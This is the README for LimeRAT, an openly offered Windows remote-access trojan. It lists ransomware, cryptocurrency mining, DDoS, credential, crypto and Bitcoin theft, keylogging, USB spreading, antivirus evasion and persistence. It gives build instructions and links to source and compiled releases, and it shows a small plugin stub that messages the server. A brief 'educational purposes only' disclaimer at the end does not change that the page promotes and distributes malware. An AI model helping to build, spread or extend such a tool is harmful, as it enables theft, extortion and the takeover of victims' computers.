<img src="https://i.imgur.com/Iq5MkAf.gif">

# LimeRAT v0.1.9
	
***Remote Administration Tool For Windows***
 
---
 
 ## Description
 Simple yet powerful RAT for Windows machines. This project is simple and easy to understand, It should give you a general knowledge about dotNET malwares and how it behaves. 
 
 ---

## Main Features

- **.NET**
    - Coded in Visual Basic .NET, Client required framework 2.0 or 4.0 dependency, And server is 4.0
- **Connection**
    - Using pastebin.com as ip:port , Instead of noip.com DNS. And Also using multi-ports
- **Plugin**
    - Using plugin system to decrease stub's size and lower the AV detection
- **Encryption**
    - The communication between server & client is encrypted with AES
- **Spreading**
    - Infecting all files and folders on USB drivers
- **Bypass**
    - Low AV detection and undetected startup method
- **Lightweight**
    - Payload size is about 25 KB
- **Anti Virtual Machines**
    - Uninstall itself if the machine is virtual to avoid scanning or analyzing 
- **Ransomware**
    - Encrypting files on all HHD and USB with .Lime extension
- **XMR Miner**
    - High performance Monero CPU miner with user idle\active optimizations
- **DDoS**
    - Creating a powerful DDOS attack to make an online service unavailable
- **Crypto Stealer**
    - Stealing Cryptocurrency sensitive data
- **Screen-Locker**
    - Prevents user from accessing their Windows GUI  
 - **And more**
    - On Connect Auto Task
	- Force enable Windows RDP
	- Persistence
    - File manager
    - Passowrds stealer
    - Remote desktop
    - Bitcoin grabber
    - Downloader
    - Keylogger

---

## Prerequisites

To open project you need:

1. Visual Studio 2017
2. This repository
 
---

## Peek
### *Project*
<img src="https://i.imgur.com/lkzM788.gif">


### *Ransomware*
<img src="https://i.imgur.com/aZjpXFe.gif">


### *Critical Process*
<img src="https://i.imgur.com/ULqF7n5.gif">

---

## Plugin Example
#### VB.NET
```vb.net
'Easy to create a DLL plugin
Public Class Main
'Simple Msgbox
 Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

  Msgbox("Hello Client!")

  Send("MSG" + SPL + "Hello Server!")
  'Client will send msg back to server, MSG will be showen in [LOG] Tab
	
 End Sub	
End Class
```

#### C#
```c#
public class Main
{
    // Simple Msgbox
    public static void CN(string H, int P, string K, string SP, string PW, string FP, string HW, string BT, string PB)
    {
        Msgbox("Hello Client!");

        Send("MSG" + SPL + "Hello Server!");
		// Client will send msg back to server, MSG will be showen in [LOG] Tab
    }
}
```
---
 
## Testing

1. Open "LimeRAT.sln" 
2. Set Compiler to "Debug" mode
3. On Solution Explorer, Right click on "Solution LimeRAT Project" and press "Rebuild Solution"
4. Press Run button. be aware that both client and server are localhost

---

## Compiling
 
1. Open "LimeRAT.sln" 
2. Set Compiler to "Release" mode
3. On Solution Explorer, Right click on "Solution LimeRAT Project" and press "Rebuild Solution"
4. Everything will be under "\Project\_EXE\Release"
5. Convert stub.exe to stub.il, using [Ildasm](https://pastebin.com/raw/rGCQC1zq)

---

## Download SRC and compiled version

https://github.com/NYAN-x-CAT/Lime-RAT/releases


 ```
 This project was only tested on local-lab[LAN]. I did not test it on external-lab[WAN].
 Server tested on Windows 10, Client tested on virtual machine windows 7.
 ```
 
 ---
 
 ## Notes
 
1. While using ransomware, restore point won't be deleted unless payload is running hight privilege
2. Anti-Kill (BSOD) won't work unless payload is running hight privilege

> Found a bug? Please, report it here https://github.com/NYAN-x-CAT/Lime-RAT/issues/new

---

## Author

* **NYAN CAT**  

---

## Donation

**Buy me a coffee!**
* XMR: `49H8Kbf15JFN2diG5evGHA5G49qhgFBuDid86z3MKxTv59dcqySCzFWUL3SgsEk2SufzTziHp3UE5P8BatwuyFuv1bBKQw2`
* BTC: `12hTx7u7AqdNr8qo4UFuLwb6XAVjoDioax`

---

## Support

* Github: https://github.com/NYAN-x-CAT/Lime-RAT/issues/new
* Email: NYANxCAT@pm.me

---

## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

---

## License
[![License](http://img.shields.io/:license-mit-blue.svg?style=flat-square)](/LICENSE)

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details
